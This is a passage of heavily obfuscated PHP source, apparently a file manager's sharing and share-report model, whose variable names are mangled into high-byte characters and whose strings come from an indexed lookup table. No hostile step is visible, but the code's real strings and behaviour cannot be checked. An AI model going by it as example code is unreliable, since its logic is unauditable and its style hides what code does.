getInfoByPath($†¨àÀö¿) { $ı’›‰º =& $_SERVER[Ş­ğŠìÒ]; $Ò »¼üò = array($ı’›‰º[1764] => USER_ID, $ı’›‰º[193] => $†¨àÀö¿); return $this->_getShareInfo($Ò »¼üò); } public function getInfoBySourcePath($÷š§¬²à) { $æÁçè =& $_SERVER[Ş­ğŠìÒ]; $‡É•§çü = array($æÁçè[1764] => USER_ID, $æÁçè[1253] => $÷š§¬²à); return $this->_getShareInfo($‡É•§çü); } private function _getShareInfo($ÍÇø­Æë) { $œ¤‰ü®» =& $_SERVER[Ş­ğŠìÒ]; $Å‘ëû£Ü = $this->where($ÍÇø­Æë)->find(); if (!$Å‘ëû£Ü) { return !1; } $ÍÇø­Æë = array($œ¤‰ü®»[665] => $Å‘ëû£Ü[$œ¤‰ü®»[665]]); $™Ù½ï²Ô = $œ¤‰ü®»[2111]; $Ñ˜¥¸“İ = Model($œ¤‰ü®»[666])->order($œ¤‰ü®»[475])->field($™Ù½ï²Ô)->where($ÍÇø­Æë)->select(); if ($Å‘ëû£Ü[$œ¤‰ü®»[193]] == $œ¤‰ü®»[228]) { $Å‘ëû£Ü[$œ¤‰ü®»[90]] = IO::info($Å‘ëû£Ü[$œ¤‰ü®»[1253]]); } else { $Å‘ëû£Ü[$œ¤‰ü®»[90]] = Model($œ¤‰ü®»[1414])->pathInfo($Å‘ëû£Ü[$œ¤‰ü®»[193]]); } $Å‘ëû£Ü[$œ¤‰ü®»[2112]] = $Ñ˜¥¸“İ; return $Å‘ëû£Ü; } protected function getInfoAuth($ŸÓ °…Ú) { $øÑ¦¡¹½ =& $_SERVER[Ş­ğŠìÒ]; $ûÙÎèœ = $this->getInfo($ŸÓ °…Ú); if ($ûÙÎèœ[$øÑ¦¡¹½[1764]] == USER_ID) { $ûÙÎèœ[$øÑ¦¡¹½[487]] = $ûÙÎèœ[$øÑ¦¡¹½[90]][$øÑ¦¡¹½[487]]; } else { $ûÙÎèœ[$øÑ¦¡¹½[487]] = Model($øÑ¦¡¹½[567])->authMake($ûÙÎèœ[$øÑ¦¡¹½[2112]]); } return $ûÙÎèœ; } protected function listData($“˜¹²õ = null, $¤´×İÕÛ = 300) { $ß×áÀË =& $_SERVER[Ş­ğŠìÒ]; $“›ÍÅî§ = array(array($ß×áÀË[562] => array($ß×áÀË[1086], 0), $ß×áÀË[663] => array($ß×áÀË[1086], 0), $ß×áÀË[2113] => $ß×áÀË[2066])); if ($“˜¹²õ == $ß×áÀË[2114]) { $“›ÍÅî§ = array($ß×áÀË[562] => 1); } else { if ($“˜¹²õ == $ß×áÀË[1238]) { $“›ÍÅî§ = array($ß×áÀË[663] => 1); } } $“›ÍÅî§[$ß×áÀË[1764]] = USER_ID; $Ò¾Šôôò = $this->where($“›ÍÅî§)->selectPage($¤´×İÕÛ); return $Ò¾Šôôò; } protected function listToMe($®©‚±Öô = 300) { $êÒ…‰Ç =& $_SERVER[Ş­ğŠìÒ]; $şÅÏÒí = Model($êÒ…‰Ç[2115])->userGroupParents(USER_ID); $ª´½¦«é = array($êÒ…‰Ç[648] => SourceModel::TYPE_USER, $êÒ…‰Ç[569] => USER_ID); if ($şÅÏÒí) { $ª´½¦«é = array(array($êÒ…‰Ç[648] => SourceModel::TYPE_USER, $êÒ…‰Ç[569] => USER_ID), array($êÒ…‰Ç[648] => SourceModel::TYPE_GROUP, $êÒ…‰Ç[569] => array($êÒ…‰Ç[7], $şÅÏÒí)), $êÒ…‰Ç[2113] => $êÒ…‰Ç[2066]); } $”ÛŠ‰– = Model($êÒ…‰Ç[666])->where($ª´½¦«é)->selectPage($®©‚±Öô); $’¥å¼Ì = array_to_keyvalue_group($”ÛŠ‰–[$êÒ…‰Ç[445]], $êÒ…‰Ç[665]); if (!$’¥å¼Ì) { return $”ÛŠ‰–; } $½í•ÃŞ = $êÒ…‰Ç[2116]; $ª´½¦«é = array($êÒ…‰Ç[665] => array($êÒ…‰Ç[492], array_keys($’¥å¼Ì)), $êÒ…‰Ç[1764] => array($êÒ…‰Ç[1088], $êÒ…‰Ç[228])); $×²˜òŠ† = $this->field($½í•ÃŞ)->where($ª´½¦«é)->select(); foreach ($×²˜òŠ† as $•Ñ»Ü°Ö => &$ø‚ÄÜŸÎ) { $ø‚ÄÜŸÎ[$êÒ…‰Ç[2112]] = $’¥å¼Ì[$ø‚ÄÜŸÎ[$êÒ…‰Ç[665]]]; } unset($ø‚ÄÜŸÎ); $ÑÇˆÜÖ¡ = array($êÒ…‰Ç[2117] => $×²˜òŠ†, $êÒ…‰Ç[2118] => $”ÛŠ‰–[$êÒ…‰Ç[442]]); return $ÑÇˆÜÖ¡; } protected function shareAdd($ ĞĞ‰‡, $Õ™Ô¦‘ı) { $¡Àéé´ì =& $_SERVER[Ş­ğŠìÒ]; $¥¤Äşâº = $this->_addShareData($ ĞĞ‰‡, $Õ™Ô¦‘ı); if (!empty($Õ™Ô¦‘ı[$¡Àéé´ì[2119]])) { $this->_shareAuthSet($¥¤Äşâº, $Õ™Ô¦‘ı[$¡Àéé´ì[2119]]); } $this->shareEventAdd($ ĞĞ‰‡, $Õ™Ô¦‘ı, $¡Àéé´ì[2120]); return $¥¤Äşâº; } protected function shareAddSystem($‹š×¯¢ú, $‰¢šÑßº) { $ì‘‘³ªâ =& $_SERVER[Ş­ğŠìÒ]; $¯’¹ÔÑö = $this->_addShareData($‹š×¯¢ú, $‰¢šÑßº, $ì‘‘³ªâ[191]); $this->_shareAuthSet($¯’¹ÔÑö, $‰¢šÑßº[$ì‘‘³ªâ[2119]]); return $¯’¹ÔÑö; } private function shareEventAdd($³‘¡Ôº, $¬“¹øáò, $ãÔÅ£­ = "\x61\x64\x64") { $ßúÔÒä© =& $_SERVER[Ş­ğŠìÒ]; if (!$³‘¡Ôº || $³‘¡Ôº == $ßúÔÒä©[228]) { return; } if ($ãÔÅ£­ == $ßúÔÒä©[2120]) { if ($¬“¹øáò[$ßúÔÒä©[562]] == $ßúÔÒä©[91]) { Model($ßúÔÒä©[633])->eventShare($³‘¡Ôº, $ßúÔÒä©[2121]); } if ($¬“¹øáò[$ßúÔÒä©[663]] == $ßúÔÒä©[91]) { Model($ßúÔÒä©[633])->eventShare($³‘¡Ôº, $ßúÔÒä©[2122]); } return; } $˜ƒÃøİ = $this->getInfoByPath($³‘¡Ôº); $ØÌƒÉÈ· = $ßúÔÒä©[2123]; if ($˜ƒÃøİ[$ßúÔÒä©[562]] == $ßúÔÒä©[228] && $¬“¹øáò[$ßúÔÒä©[562]] == $ßúÔÒä©[91]) { $ØÌƒÉÈ· = $ßúÔÒä©[2121]; } if ($˜ƒÃøİ[$ßúÔÒä©[562]] == $ßúÔÒä©[91] && $¬“¹øáò[$ßúÔÒä©[562]] == $ßúÔÒä©[228]) { $ØÌƒÉÈ· = $ßúÔÒä©[2124]; } if ($˜ƒÃøİ[$ßúÔÒä©[663]] == $ßúÔÒä©[228] && $¬“¹øáò[$ßúÔÒä©[663]] == $ßúÔÒä©[91]) { $ØÌƒÉÈ· = $ßúÔÒä©[2122]; } if ($˜ƒÃøİ[$ßúÔÒä©[663]] == $ßúÔÒä©[91] && $¬“¹øáò[$ßúÔÒä©[663]] == $ßúÔÒä©[228]) { $ØÌƒÉÈ· = $ßúÔÒä©[2125]; } Model($ßúÔÒä©[633])->eventShare($³‘¡Ôº, $ØÌƒÉÈ·); return; } private function _addShareData($öïÖœ¬°, $•ÈŒÏ = array(), $€ÉÂöÖØ = false) { $Ñğ¯«Â =& $_SERVER[Ş­ğŠìÒ]; $ì¶×É£ = $€ÉÂöÖØ == $Ñğ¯«Â[191] ? 0 : USER_ID; $³ñá¥üÕ = array($Ñğ¯«Â[491] => $öïÖœ¬°, $Ñğ¯«Â[1755] => $ì¶×É£); if ($öïÖœ¬° == 0) { $³ñá¥üÕ = array($Ñğ¯«Â[2126] => $•ÈŒÏ[$Ñğ¯«Â[1253]], $Ñğ¯«Â[1755] => $ì¶×É£); } if ($İåó°İ = $this->where($³ñá¥üÕ)->find()) { return $İåó°İ[$Ñğ¯«Â[665]]; } if ($öïÖœ¬° == 0) { $©ËñŸÍ¼ = array($Ñğ¯«Â[32] => get_path_this($•ÈŒÏ[$Ñğ¯«Â[87]])); } else { $©ËñŸÍ¼ = Model($Ñğ¯«Â[891])->sourceInfo($öïÖœ¬°); if (!$©ËñŸÍ¼) { return !1; } } if (!$•ÈŒÏ[$Ñğ¯«Â[1653]]) { $•ÈŒÏ[$Ñğ¯«Â[1653]] = $©ËñŸÍ¼[$Ñğ¯«Â[32]]; } $ì¤€ë“ = array($Ñğ¯«Â[1755] => $ì¶×É£, $Ñğ¯«Â[491] => $öïÖœ¬°, $Ñğ¯«Â[1653] => $Ñğ¯«Â[12], $Ñğ¯«Â[562] => 0, $Ñğ¯«Â[663] => 0, $Ñğ¯«Â[1253] => $Ñğ¯«Â[12], $Ñğ¯«Â[383] => $Ñğ¯«Â[12], $Ñğ¯«Â[963] => $Ñğ¯«Â[12], $Ñğ¯«Â[2127] => 0, $Ñğ¯«Â[2128] => 0, $Ñğ¯«Â[828] => 0, $Ñğ¯«Â[2129] => $Ñğ¯«Â[12], $Ñğ¯«Â[2110] => $Ñğ¯«Â[12]); $Æı»­áí = explode($Ñğ¯«Â[50], $Ñğ¯«Â[2130]); foreach ($Æı»­áí as $…ä„âèƒ) { if (!isset($•ÈŒÏ[$…ä„âèƒ])) { continue; } $ì¤€ë“[$…ä„âèƒ] = $•ÈŒÏ[$…ä„âèƒ]; } $—òóÕôğ = $this->add($ì¤€ë“); $êˆ‹Îç¬ = array($Ñğ¯«Â[2110] => short_id($—òóÕôğ)); $this->where(array($Ñğ¯«Â[2131] => $—òóÕôğ))->save($êˆ‹Îç¬); return $—òóÕôğ; } private function _shareAuthSet($Á®ü¾ê¹, $¡±ËíÒ) { $ø¿ŒÉ­ =& $_SERVER[Ş­ğŠìÒ]; if (!is_array($¡±ËíÒ)) { return !1; } $˜Æ¬³µ“ = Model($ø¿ŒÉ­[2076]); $˜Æ¬³µ“->where(array($ø¿ŒÉ­[665] => $Á®ü¾ê¹))->delete(); $óøà¥ƒ = array(); foreach ($¡±ËíÒ as $ú°ø‰Çğ) { $×É¯øƒÌ = SourceModel::TYPE_USER; if ($ú°ø‰Çğ[$ø¿ŒÉ­[190]] == SourceModel::TYPE_GROUP) { $×É¯øƒÌ = SourceModel::TYPE_GROUP; } $ÛüÄ Ñ = array($ø¿ŒÉ­[665] => $Á®ü¾ê¹, $ø¿ŒÉ­[190] => $×É¯øƒÌ, $ø¿ŒÉ­[569] => intval($ú°ø‰Çğ[$ø¿ŒÉ­[569]]), $ø¿ŒÉ­[2072] => 0, $ø¿ŒÉ­[2132] => -1); if ($ú°ø‰Çğ[$ø¿ŒÉ­[2072]]) { $ÛüÄ Ñ[$ø¿ŒÉ­[2072]] = $ú°ø‰Çğ[$ø¿ŒÉ­[2072]]; } else { if ($ú°ø‰Çğ[$ø¿ŒÉ­[2132]]) { $ÛüÄ Ñ[$ø¿ŒÉ­[2132]] = $ú°ø‰Çğ[$ø¿ŒÉ­[2132]]; } } $óøà¥ƒ[] = $ÛüÄ Ñ; } return $˜Æ¬³µ“->addAll($óøà¥ƒ, array(), !0); } public function numViewAdd($ô¦ÀòßÉ) { $—¦¬ÔÕ¢ =& $_SERVER[Ş­ğŠìÒ]; $ÜË†÷ = array($—¦¬ÔÕ¢[2131] => $ô¦ÀòßÉ); $this->where($ÜË†÷)->setAdd($—¦¬ÔÕ¢[2127]); } public function numDownloadAdd($¸â…•ñë) { $éàì‡Å» =& $_SERVER[Ş­ğŠìÒ]; $ØÙúè ş = array($éàì‡Å»[2131] => $¸â…•ñë); $this->where($ØÙúè ş)->setAdd($éàì‡Å»[2128]); } protected function shareEdit($¿››’Ëˆ, $ÉâªñÂª) { $¹’­Æ›Á =& $_SERVER[Ş­ğŠìÒ]; $Ê›ìÜÕ = $this->getInfo($¿››’Ëˆ); if (!$Ê›ìÜÕ) { return !1; } $this->_checkLinkShare($ÉâªñÂª, $Ê›ìÜÕ); $ªÇ¦Æ¤í = array(); $…Üú¯Õº = explode($¹’­Æ›Á[50], $¹’­Æ›Á[2133]); foreach ($…Üú¯Õº as $É…çÄº) { if (!array_key_exists($É…çÄº, $ÉâªñÂª)) { continue; } $ªÇ¦Æ¤í[$É…çÄº] = $ÉâªñÂª[$É…çÄº]; } $this->shareEventAdd($Ê›ìÜÕ[$¹’­Æ›Á[193]], $ÉâªñÂª, $¹’­Æ›Á[1932]); $this->where(array($¹’­Æ›Á[2131] => $¿››’Ëˆ))->save($ªÇ¦Æ¤í); if (isset($ÉâªñÂª[$¹’­Æ›Á[2119]])) { $this->_shareAuthSet($¿››’Ëˆ, $ÉâªñÂª[$¹’­Æ›Á[2119]]); } return !0; } private function _checkLinkShare($Ğâ³—† , $„ÉÖçç) { $Ç¸İ¸Òæ =& $_SERVER[Ş­ğŠìÒ]; if ($Ğâ³—† [$Ç¸İ¸Òæ[562]] != $Ç¸İ¸Òæ[91]) { return; } $ÃÖÑÙÛ‚ = $„ÉÖçç[$Ç¸İ¸Òæ[90]][$Ç¸İ¸Òæ[193]]; if ($„ÉÖçç[$Ç¸İ¸Òæ[90]][$Ç¸İ¸Òæ[33]] != $Ç¸İ¸Òæ[230]) { $®¹¸äç¼ = $this->_folderReport($ÃÖÑÙÛ‚); if (!$®¹¸äç¼) { return; } show_json(LNG($Ç¸İ¸Òæ[2134]) . $Ç¸İ¸Òæ[2135] . $®¹¸äç¼, !1); } $ãºèÜ¼… = Model($Ç¸İ¸Òæ[891])->fileInfoGet($„ÉÖçç[$Ç¸İ¸Òæ[90]][$Ç¸İ¸Òæ[193]]); if (!$ãºèÜ¼…) { return; } $ºûµŒİ¡ = $this->shareFileMeta($ãºèÜ¼…[$Ç¸İ¸Òæ[541]]); if (isset($ºûµŒİ¡[$Ç¸İ¸Òæ[450]]) && $ºûµŒİ¡[$Ç¸İ¸Òæ[450]] == $Ç¸İ¸Òæ[91]) { show_json(LNG($Ç¸İ¸Òæ[2136]), !1); } } private function _folderReport($í—«ÆË) { $û½ÃÑôÉ =& $_SERVER[Ş­ğŠìÒ]; $Á÷õòì¼ = array($û½ÃÑôÉ[541] => array($û½ÃÑôÉ[1086], 0), $û½ÃÑôÉ[817] => 3); $ÑÓ’ÅØÌ = Model($û½ÃÑôÉ[2137])->where($Á÷õòì¼)->field($û½ÃÑôÉ[541])->select(); if (!$ÑÓ’ÅØÌ) { return !1; } $ÑÓ’ÅØÌ = array_to_keyvalue($ÑÓ’ÅØÌ, $û½ÃÑôÉ[12], $û½ÃÑôÉ[541]); $ªëÆ­‰ = $û½ÃÑôÉ[50] . $í—«ÆË . $û½ÃÑôÉ[50]; $Á÷õòì¼ = array($û½ÃÑôÉ[541] => array($û½ÃÑôÉ[7], $ÑÓ’ÅØÌ), $û½ÃÑôÉ[584] => array($û½ÃÑôÉ[459], "\x25{$ªëÆ­‰}\45"), $û½ÃÑôÉ[505] => 0); $íäÓşò½ = Model($û½ÃÑôÉ[891])->where($Á÷õòì¼)->field($û½ÃÑôÉ[2138])->find(); if (!$íäÓşò½) { return !1; } $ìè²ÜüÑ = substr($íäÓşò½[$û½ÃÑôÉ[584]], strpos($íäÓşò½[$û½ÃÑôÉ[584]], $ªëÆ­‰)); $Á÷õòì¼ = array($û½ÃÑôÉ[193] => array($û½ÃÑôÉ[7], trim($ìè²ÜüÑ, $û½ÃÑôÉ[50]))); $ã¡…ê¶Á = Model($û½ÃÑôÉ[891])->where($Á÷õòì¼)->field($û½ÃÑôÉ[32])->select(); $Ÿ¢‹‚™× = array_to_keyvalue($ã¡…ê¶Á, $û½ÃÑôÉ[12], $û½ÃÑôÉ[32]); $Ÿ¢‹‚™×[] = $íäÓşò½[$û½ÃÑôÉ[32]]; return implode($û½ÃÑôÉ[8], $Ÿ¢‹‚™×); } protected function remove($Áò˜Ç) { $øÌı°º¤ =& $_SERVER[Ş­ğŠìÒ]; $¸¿„Ÿ¾£ = is_array($Áò˜Ç) ? $Áò˜Ç : array($Áò˜Ç); for ($ÒÏŞ‰á = 0; $ÒÏŞ‰á < count($¸¿„Ÿ¾£); $ÒÏŞ‰á++) { $Äˆ½Šàˆ = $this->getInfo($¸¿„Ÿ¾£[$ÒÏŞ‰á]); if ($Äˆ½Šàˆ[$øÌı°º¤[663]] == $øÌı°º¤[91]) { Model($øÌı°º¤[633])->eventShare($Äˆ½Šàˆ[$øÌı°º¤[193]], $øÌı°º¤[2125]); } if ($Äˆ½Šàˆ[$øÌı°º¤[562]] == $øÌı°º¤[91]) { Model($øÌı°º¤[633])->eventShare($Äˆ½Šàˆ[$øÌı°º¤[193]], $øÌı°º¤[2124]); } } if (is_array($Áò˜Ç)) { $Áò˜Ç = array($øÌı°º¤[7], $Áò˜Ç); } $…õ¬ñ¡– = array($øÌı°º¤[665] => $Áò˜Ç); $óóÕ—‚Â = $this->where($…õ¬ñ¡–)->delete(); if ($óóÕ—‚Â) { Model($øÌı°º¤[666])->where(array($øÌı°º¤[665] => $Áò˜Ç))->delete(); } return $óóÕ—‚Â; } protected function removeBySource($šåÛÇ”È) { $É¬õ¢‰¿ =& $_SERVER[Ş­ğŠìÒ]; $Í›¤­É = array($É¬õ¢‰¿[491] => array($É¬õ¢‰¿[492], $šåÛÇ”È)); $Øò†•£¹ = $this->field($É¬õ¢‰¿[665])->where($Í›¤­É)->select(); $Øò†•£¹ = array_to_keyvalue($Øò†•£¹, $É¬õ¢‰¿[12], $É¬õ¢‰¿[665]); if (!$Øò†•£¹) { return; } $Í›¤­É = array($É¬õ¢‰¿[2131] => array($É¬õ¢‰¿[492], $Øò†•£¹)); $this->where($Í›¤­É)->delete(); Model($É¬õ¢‰¿[666])->where($Í›¤­É)->delete(); } public function listAll($–ÀÜ†) { $í°ôç =& $_SERVER[Ş­ğŠìÒ]; $İ„úÚˆ = array(); if ($–ÀÜ†[$í°ôç[1764]]) { $İ„úÚˆ[$í°ôç[1764]] = $–ÀÜ†[$í°ôç[1764]]; } if ($–ÀÜ†[$í°ôç[827]]) { $ñûü«‡ = $–ÀÜ†[$í°ôç[828]] ? $–ÀÜ†[$í°ôç[828]] : strtotime(date($í°ôç[2139])); $İ„úÚˆ[$í°ôç[231]] = array($í°ôç[409], array($–ÀÜ†[$í°ôç[827]], $ñûü«‡)); } if ($–ÀÜ†[$í°ôç[33]]) { $İ„úÚˆ[$–ÀÜ†[$í°ôç[33]]] = 1; } else { $İ„úÚˆ[] = array($í°ôç[562] => array($í°ôç[1086], 0), $í°ôç[663] => array($í°ôç[1086], 0), $í°ôç[2113] => $í°ôç[2066]); } if ($–ÀÜ†[$í°ôç[2062]]) { $İ„úÚˆ[] = array($í°ôç[2110] => $–ÀÜ†[$í°ôç[2062]], $í°ôç[1653] => array($í°ôç[459], "\45{$–ÀÜ†[$í°ôç[2062]]}\45"), $í°ôç[2113] => $í°ôç[2066]); } $Ë£ø¯á­ = $this->_makeOrder()->where($İ„úÚˆ)->selectPage(20); if (empty($Ë£ø¯á­[$í°ôç[445]])) { return array(); } $this->_listDataApply($Ë£ø¯á­[$í°ôç[445]]); return $Ë£ø¯á­; } public function listDataApply($ÔÖ°‰øç) { $this->_listDataApply($ÔÖ°‰øç); return $ÔÖ°‰øç; } private function _listDataApply(&$Ü»î£–Ç) { $ÀºúÒ°• =& $_SERVER[Ş­ğŠìÒ]; $ƒ‚¸ëî™ = array_to_keyvalue($Ü»î£–Ç, $ÀºúÒ°•[12], $ÀºúÒ°•[1764]); $Ï÷´•‘Ê = Model($ÀºúÒ°•[598])->userListInfo(array_unique($ƒ‚¸ëî™)); $ÉŠ”»è¹ = array_to_keyvalue($Ü»î£–Ç, $ÀºúÒ°•[12], $ÀºúÒ°•[193]); $ˆš«éåı = Model($ÀºúÒ°•[891])->sourceListInfo($ÉŠ”»è¹, !0); foreach ($Ü»î£–Ç as $‹±‚øŒ„ => &$úåŠù®‚) { $¿ÔÖÌ‹¶ = $úåŠù®‚[$ÀºúÒ°•[1764]]; $úåŠù®‚[$ÀºúÒ°•[2140]] = $Ï÷´•‘Ê[$¿ÔÖÌ‹¶] ? $Ï÷´•‘Ê[$¿ÔÖÌ‹¶] : !1; $á¥§Ş’Ü = $úåŠù®‚[$ÀºúÒ°•[193]]; $úåŠù®‚[$ÀºúÒ°•[90]] = $ˆš«éåı[$á¥§Ş’Ü] ? $ˆš«éåı[$á¥§Ş’Ü] : !1; if ($úåŠù®‚[$ÀºúÒ°•[90]][$ÀºúÒ°•[505]] == $ÀºúÒ°•[91]) { unset($Ü»î£–Ç[$‹±‚øŒ„]); } if ($úåŠù®‚[$ÀºúÒ°•[90]] != $ÀºúÒ°•[228] && !$úåŠù®‚[$ÀºúÒ°•[90]]) { unset($Ü»î£–Ç[$‹±‚øŒ„]); } } unset($úåŠù®‚); $Ü»î£–Ç = array_values($Ü»î£–Ç); } private function _makeOrder($®Á¢¹Ô = '') { $Æ…ô÷­– =& $_SERVER[Ş­ğŠìÒ]; $œ€Ö‡¢á = array($Æ…ô÷­–[231], $Æ…ô÷­–[828], $Æ…ô÷­–[2127], $Æ…ô÷­–[2128]); $ÉŞŸ˜… = array($Æ…ô÷­–[523] => $Æ…ô÷­–[524], $Æ…ô÷­–[525] => $Æ…ô÷­–[526]); $øÀ£“ = Input::get($Æ…ô÷­–[530], $Æ…ô÷­–[7], $Æ…ô÷­–[497], $œ€Ö‡¢á); $ßÖôàÛÀ = Input::get($Æ…ô÷­–[531], $Æ…ô÷­–[7], $Æ…ô÷­–[2141], array($Æ…ô÷­–[2059], $Æ…ô÷­–[525])); $ßÖôàÛÀ = $ÉŞŸ˜…[$ßÖôàÛÀ]; $®Á¢¹Ô = $®Á¢¹Ô . "{$øÀ£“}\x20{$ßÖôàÛÀ}"; return $this->order($®Á¢¹Ô); } public function reportAdd($®¢åúÙÚ) { $¼î Ä×• =& $_SERVER[Ş­ğŠìÒ]; $ÄòÁ×„Ì = array($¼î Ä×•[665] => $®¢åúÙÚ[$¼î Ä×•[665]], $¼î Ä×•[1764] => USER_ID); if (Model($¼î Ä×•[2137])->where($ÄòÁ×„Ì)->find()) { return !1; } $Ò­€’ = array($¼î Ä×•[665] => $®¢åúÙÚ[$¼î Ä×•[665]], $¼î Ä×•[1653] => $®¢åúÙÚ[$¼î Ä×•[1653]], $¼î Ä×•[193] => $®¢åúÙÚ[$¼î Ä×•[193]], $¼î Ä×•[541] => $®¢åúÙÚ[$¼î Ä×•[541]], $¼î Ä×•[1764] => USER_ID, $¼î Ä×•[33] => $®¢åúÙÚ[$¼î Ä×•[33]], $¼î Ä×•[526] => $®¢åúÙÚ[$¼î Ä×•[526]]); return Model($¼î Ä×•[2137])->add($Ò­€’); } public function reportList($µç‘Ó¼ç) { $´¬¶õÍÍ =& $_SERVER[Ş­ğŠìÒ]; $ç†î§‰è = array(); if ($µç‘Ó¼ç[$´¬¶õÍÍ[827]]) { $È‰ëÈîÆ = $µç‘Ó¼ç[$´¬¶õÍÍ[828]] ? $µç‘Ó¼ç[$´¬¶õÍÍ[828]] : strtotime(date($´¬¶õÍÍ[2139])); $ç†î§‰è[$´¬¶õÍÍ[231]] = array($´¬¶õÍÍ[409], array($µç‘Ó¼ç[$´¬¶õÍÍ[827]], $È‰ëÈîÆ)); } if (isset($µç‘Ó¼ç[$´¬¶õÍÍ[33]]) && in_array($µç‘Ó¼ç[$´¬¶õÍÍ[33]], array($´¬¶õÍÍ[91], $´¬¶õÍÍ[510], $´¬¶õÍÍ[2142], $´¬¶õÍÍ[2143], $´¬¶õÍÍ[2144]))) { $ç†î§‰è[$´¬¶õÍÍ[33]] = $µç‘Ó¼ç[$´¬¶õÍÍ[33]]; } if (isset($µç‘Ó¼ç[$´¬¶õÍÍ[817]]) && in_array($µç‘Ó¼ç[$´¬¶õÍÍ[817]], array($´¬¶õÍÍ[228], $´¬¶õÍÍ[91], $´¬¶õÍÍ[510], $´¬¶õÍÍ[2142]))) { $ç†î§‰è[$´¬¶õÍÍ[817]] = $µç‘Ó¼ç[$´¬¶õÍÍ[817]]; } $¾Êß‰„ = Input::get($´¬¶õÍÍ[531], $´¬¶õÍÍ[7], $´¬¶õÍÍ[2141], array($´¬¶õÍÍ[2059], $´¬¶õÍÍ[525])); $¨Äµğ— = array($´¬¶õÍÍ[523] => $´¬¶õÍÍ[524], $´¬¶õÍÍ[525] => $´¬¶õÍÍ[526]); $ÈÈ•şı = $´¬¶õÍÍ[2145] . $¨Äµğ—[$¾Êß‰„]; $¥¡áÚ‰Å = Model($´¬¶õÍÍ[2137])->where($ç†î§‰è)->order($ÈÈ•şı)->selectPage(20); if (empty($¥¡áÚ‰Å[$´¬¶õÍÍ[445]])) { return array(); } $ÔÂåË” = array_to_keyvalue_group($¥¡áÚ‰Å[$´¬¶õÍÍ[445]], $´¬¶õÍÍ[817], $´¬¶õÍÍ[665]); if (!empty($ÔÂåË”[0])) { $µç‘Ó¼ç = $ÔÂåË”[0]; $ç†î§‰è = array($´¬¶õÍÍ[665] => array($´¬¶õÍÍ[7], $µç‘Ó¼ç)); $öŸ·ô„Ô = $this->where($ç†î§‰è)->field($´¬¶õÍÍ[665])->select(); $öŸ·ô„Ô = array_to_keyvalue($öŸ·ô„Ô, $´¬¶õÍÍ[12], $´¬¶õÍÍ[665]); $œóÎûç = array_diff($µç‘Ó¼ç, $öŸ·ô„Ô); if (!empty($œóÎûç)) { foreach ($¥¡áÚ‰Å[$´¬¶õÍÍ[445]] as $ ã…„üó => $Ã²åç»Á) { if (in_array($Ã²åç»Á[$´¬¶õÍÍ[665]], $œóÎûç)) { unset($¥¡áÚ‰Å[$´¬¶õÍÍ[445]][$ ã…„üó]); } } } } $this->_listDataApply($¥¡áÚ‰Å[$´¬¶õÍÍ[445]]); return $¥¡áÚ‰Å; } public function reportStatus($‘Á¿×ª) { $¹½¨…×à =& $_SERVER[Ş­ğŠìÒ]; $µ‰à¬ = array($¹½¨…×à[475] => $‘Á¿×ª[$¹½¨…×à[475]]); $ ÔÀ”ì = Model($¹½¨…×à[2137])->where($µ‰à¬)->field($¹½¨…×à[2146])->find(); if (!$ ÔÀ”ì) { return !1; } $üçÍ´¯ = array($¹½¨…×à[817] => $‘Á¿×ª[$¹½¨…×à[817]]); if ($‘Á¿×ª[$¹½¨…×à[817]] == $¹½¨…×à[2142] && $ ÔÀ”ì[$¹½¨…×à[817]] == $¹½¨…×à[2142]) { $üçÍ´¯[$¹½¨…×à[817]] = 0; } $«®„í½Æ = Model($¹½¨…×à[2137])->where($µ‰à¬)->save($üçÍ´¯); if ($‘Á¿×ª[$¹½¨…×à[817]] == $¹½¨…×à[510]) { if ($ ÔÀ”ì[$¹½¨…×à[541]] != $¹½¨…×à[228] && $this->shareFileMeta($ ÔÀ”ì[$¹½¨…×à[541]])) { $this->shareFileMeta($ ÔÀ”ì[$¹½¨…×à[541]], 0); } $this->remove($ ÔÀ”ì[$¹½¨…×à[665]]); return !0; } if ($«®„í½Æ && $‘Á¿×ª[$¹½¨…×à[817]] == $¹½¨…×à[2142]) { $Ì—œ€äÓ = $üçÍ´¯[$¹½¨…×à[817]] == $¹½¨…×à[2142] ? 1 : 0; $this->shareFileMeta($ ÔÀ”ì[$¹½¨…×à[541]], $Ì—œ€äÓ); $this->removeByFile($ ÔÀ”ì[$¹½¨…×à[541]]); } return $«®„í½Æ; } private function removeByFile($ä‘Õ¦) { $…ã‘Ü† =& $_SERVER[Ş­ğŠìÒ]; $€’ÄãÊ = Model($…ã‘Ü†[891])->where(array($…ã‘Ü†[541] => $ä‘Õ¦))->field($…ã‘Ü†[193])->select(); $ª‘Ø”¡É = array_to_keyvalue($€’ÄãÊ, $…ã‘Ü†[12], $…ã‘Ü†[193]); $ëßè«Ô = array($…ã‘Ü†[193] => array($…ã‘Ü†[7], $ª‘Ø”¡É), $…ã‘Ü†[562] => 1); $€’ÄãÊ = $this->where($ëßè«Ô)->field($…ã‘Ü†[665])->select(); if (empty($€’ÄãÊ)) { return; } $¤ºÇ”àª = array_to_keyvalue($€’ÄãÊ, $…ã‘Ü†[12], $…ã‘Ü†[665]); $this->remove($¤ºÇ”àª); } private function shareFileMeta($´Úô§‡Ì, $±¥ãş§¨ = null) { $‹í€·±¡ =& $_SERVER[Ş­ğŠìÒ]; $èÛûª = array($‹í€·±¡[541] => $´Úô§‡Ì, $‹í€·±¡[97] => $‹í€·±¡[2147]); if (is_null($±¥ãş§¨)) { return Model($‹í€·±¡[2148])->where($èÛûª)->find(); } $èÛûª[$‹í€·±¡[450]] = $±¥ãş§¨; Model($‹í€·±¡[2148])->add($èÛûª, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\162\x63\145\137\141\x75\164\x68"; public function getAuth($–Ë…ïà) { $åìì¥ŒÍ =& $_SERVER[Ş­ğŠìÒ]; $ª¬€—Î„ = $this->sourceAuthSelect($–Ë…ïà); $Åüüç«¤ = array(); $ÖËÕ±Øğ = array(); $¬ß¸ÒŠã = 2 << 25; foreach ($ª¬€—Î„ as $ÓŠ¦ÇÈÊ) { $ †àïîß = Model($åìì¥ŒÍ[571])->listData($ÓŠ¦ÇÈÊ[$åìì¥ŒÍ[2072]]); if (!$ †àïîß) { continue; } $Åüüç«¤[] = $ÓŠ¦ÇÈÊ; $‡ÑÜè¥¿ = 0; if ($ÓŠ¦ÇÈÊ[$åìì¥ŒÍ[190]] == SourceModel::TYPE_GROUP) { $‡ÑÜè¥¿ = $¬ß¸ÒŠã * 2; } if ($ÓŠ¦ÇÈÊ[$åìì¥ŒÍ[190]] == SourceModel::TYPE_USER) { $‡ÑÜè¥¿ = $¬ß¸ÒŠã; } if 